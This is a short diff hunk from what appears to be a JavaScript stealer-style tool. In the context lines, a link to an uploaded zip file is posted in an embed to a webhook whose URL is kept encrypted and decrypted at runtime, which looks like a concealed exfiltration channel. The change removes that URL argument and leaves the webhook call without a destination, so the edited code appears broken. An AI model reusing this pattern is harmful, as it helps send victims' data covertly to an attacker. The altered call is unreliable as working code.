@@ -115,7 +115,7 @@ module.exports = (client) => {
             counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`
 
             await client.utils.webhook.sendToWebhook(
-                client.utils.encryption.decryptData(client.config.webhook.url), {
+                {
                     embeds: [counter_embed],
                 })
         },
